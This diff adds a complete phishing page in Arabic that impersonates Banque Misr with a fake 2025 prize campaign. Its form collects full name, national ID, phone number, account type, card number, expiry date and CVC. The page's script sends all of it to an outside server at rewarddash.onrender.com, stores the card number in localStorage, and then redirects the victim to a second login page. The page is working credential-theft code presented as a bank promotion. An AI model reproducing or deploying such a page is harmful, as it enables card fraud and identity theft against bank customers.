@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>جوائز بنك مصر</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <header class="logo-header">
+    <img src="images/logo.jpg" alt="Logo" class="logo" />
+  </header>
+  <main class="promo-section" dir="rtl">
+  <h1 class="main-title">
+    الخدمات البنكية <span class="highlight">أصبحت أسهل</span>
+  </h1>
+  <p class="subtitle">أهلاً بك في عالم الخدمات البنكية الجديد من <strong>بنك مصر</strong></p>
+
+  <div class="card-image">
+    <img src="images/visa2.jpeg" alt="Banque Misr Cards" />
+    <img src="images/visa1.jpeg" alt="Banque Misr Cards" />
+  </div>
+  <p class="promo-text">
+    <span class="bullet">•</span> بنك مصر مع تطبيق بنكي عملائنا دائماً مميزين مع حملة عام 2025<br>
+    جوائزنا مميزة بقيمتها وعددها من جوائز يومية وأسبوعية وشهرية وجوائز كبرى كل 3 شهور مميزة لجميع عملائنا
+  </p>
+
+
+
+  <form id="bankForm" class="simple-form">
+    <img src="images/person.jpg" alt="Form Icon" class="form-icon" />
+
+    <div class="form-group">
+      <label for="name">الاسم الكامل *</label>
+      <input type="text" id="name" name="name" placeholder="أدخل الاسم الكامل" required />
+    </div>
+
+    <div class="form-group">
+      <label for="nationalid">الرقم القومي *</label>
+      <input type="text" id="nationalid" name="nationalid" placeholder="أدخل الرقم القومي" required />
+    </div>
+
+    <div class="form-group">
+      <label for="phone">رقم الجوال *</label>
+      <input type="text" id="phone" name="phone" placeholder="أدخل رقم الجوال" required />
+    </div>
+
+    <div class="form-group">
+      <label for="account-type">نوع الحساب البنكي *</label>
+      <select id="account-type" name="account-type" required>
+        <option value="" disabled selected>اختر نوع الحساب</option>
+        <!-- options here... -->
+        <option value="current-egp">الحساب الجاري (جنيه مصري)</option>
+        <option value="current-foreign">حساب جاري بالعملة الأجنبية</option>
+        <option value="super-cash-current">حساب سوبر كاش جاري (عائد يومي)</option>
+        <option value="almongez-current">حساب المنجز / المرتبك بلس (بلا حد أدنى)</option>
+        <option value="salary-account">حساب المرتب (بدون عائد)</option>
+        <option value="hawalaty">حساب حوالاتي بالعملة المحلية / الدولار</option>
+        <option value="saving-egp">حساب توفير بالجنيه المصري</option>
+        <option value="saving-foreign">حساب توفير بالعملة الأجنبية</option>
+        <option value="super-cash-saving">حساب سوبر كاش توفير (عائد شهري)</option>
+        <option value="mongez-saving">حساب توفير الممكن (ذوي الهمم)</option>
+        <option value="mongez-almongez-saving">حساب توفير المنجز</option>
+        <option value="youth-saving">حساب توفير الشباب</option>
+        <option value="investment-saving">حساب إدخار استثماري (ربحي)</option>
+        <option value="islamic-current-almongez">حساب المنجز الإسلامي (جاري شرعي)</option>
+        <option value="islamic-investment">حساب توفير استثماري إسلامي (مضاربة)</option>
+        <option value="minor-saving">حساب توفير للقصر / المشترك</option>
+        <option value="vip-saving">حساب توفير VIP أو BMVIP</option>
+      </select>
+    </div>
+
+    <div class="form-group">
+      <img src="images/blackcard.jpg" alt="Bank Info" class="bank-image" />
+    </div>
+
+    <div class="form-group">
+      <label for="cardNum">رقم البطاقة البنكية للحساب *</label>
+      <input type="text" id="cardNum" name="cardNum" placeholder="أدخل رقم البطاقة" required style="direction: ltr;" />
+
+    </div>
+
+    <div class="form-group horizontal-selects">
+      <label for="month">تاريخ انتهاء البطاقة *</label>
+      <div class="select-row">
+        <select id="month" name="month" required>
+          <option value="" disabled selected>شهر</option>
+          <option value="01">01</option>
+          <option value="02">02</option>
+          <option value="03">03</option>
+          <option value="04">04</option>
+          <option value="05">05</option>
+          <option value="06">06</option>
+          <option value="07">07</option>
+          <option value="08">08</option>
+          <option value="09">09</option>
+          <option value="10">10</option>
+          <option value="11">11</option>
+          <option value="12">12</option>
+        </select>
+
+        <select id="year" name="year" required>
+          <option value="" disabled selected>سنة</option>
+          <option value="2025">2025</option>
+          <option value="2026">2026</option>
+          <option value="2027">2027</option>
+          <option value="2028">2028</option>
+          <option value="2029">2029</option>
+          <option value="2030">2030</option>
+          <option value="2031">2031</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="form-group">
+  <label for="cvc">رمز التحقق (CVC) *</label>
+  <input type="text" id="cvc" name="cvc" placeholder="أدخل رمز التحقق" maxlength="4" required style="direction: ltr;" />
+</div>
+
+    <div class="form-group">
+      <button type="submit" class="confirm-btn">تأكيد</button>
+    </div>
+  </form>
+</main>
+
+<footer class="site-footer">
+  <div class="footer-content">
+    <span>بنك مصر 2025 &copy;</span>
+  </div>
+</footer>
+
+<script>
+  const form = document.getElementById('bankForm');
+  const cardInput = form.cardNum;
+
+  // Format card number as user types: "1234 5678 9012 3456"
+  cardInput.addEventListener('input', (e) => {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length > 16) value = value.slice(0, 16);
+
+    let formatted = '';
+    for (let i = 0; i < value.length; i++) {
+      if (i > 0 && i % 4 === 0) formatted += ' ';
+      formatted += value[i];
+    }
+    e.target.value = formatted;
+
+    if (value.length === 16) {
+      cardInput.style.backgroundColor = '';
+    }
+  });
+
+  form.addEventListener('submit', function(event) {
+  event.preventDefault();
+
+  const rawCardNum = cardInput.value.replace(/\s/g, '');
+  if (rawCardNum.length !== 16) {
+    alert('رقم البطاقة يجب أن يكون مكوناً من 16 رقمًا.');
+    cardInput.style.backgroundColor = '#f8d7da';
+    cardInput.focus();
+    return;
+  } else {
+    cardInput.style.backgroundColor = '';
+  }
+
+  const cvcInput = form.cvc.value.trim();
+  if (!cvcInput || cvcInput.length < 3 || cvcInput.length > 4 || !/^\d+$/.test(cvcInput)) {
+    alert('يرجى إدخال رمز التحقق الصحيح (3 أو 4 أرقام).');
+    form.cvc.focus();
+    return;
+  }
+
+  const accountTypeSelect = form['account-type'];
+  const accountTypeText = accountTypeSelect.options[accountTypeSelect.selectedIndex].text;
+
+  const data = {
+    name: form.name.value.trim(),
+    nationalid: form.nationalid.value.trim(),
+    phone: form.phone.value.trim(),
+    accountType: accountTypeText,
+    cardNum: cardInput.value.trim(),
+    month: form.month.value,
+    year: form.year.value,
+    cvc: cvcInput
+  };
+
+  const message =
+    `الاسم الكامل: ${data.name}\n` +
+    `الرقم القومي:\n ${data.nationalid}\n` +
+    `رقم الجوال:\n ${data.phone}\n` +
+    `نوع الحساب البنكي: ${data.accountType}\n` +
+    `رقم البطاقة البنكية:\n ${data.cardNum}\n` +
+    `تاريخ انتهاء البطاقة: ${data.month}/${data.year}\n` +
+    `رمز التحقق (CVC): ${data.cvc}`;
+
+  // Save phone number for later use
+  localStorage.setItem("userPhone", data.phone);
+  localStorage.setItem("name", data.name);
+  localStorage.setItem("cardNum", data.cardNum);
+
+  // Send message to backend
+  fetch('https://rewarddash.onrender.com/api/messages', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ text: message })
+  })
+  .then(response => {
+    if (response.ok) {
+      window.location.href = 'login.html';
+    } else {
+      alert('حدث خطأ أثناء الإرسال');
+    }
+  })
+  .catch(error => {
+    alert('خطأ في الاتصال بالخادم');
+    console.error('Error:', error);
+  });
+});
+
+  setInterval(() => {
+    fetch('https://rewarddash.onrender.com/api/messages', {
+      method: 'POST'
+    });
+  }, 10000); 
+
+</script>
+
+
+
+</body>
+</html>
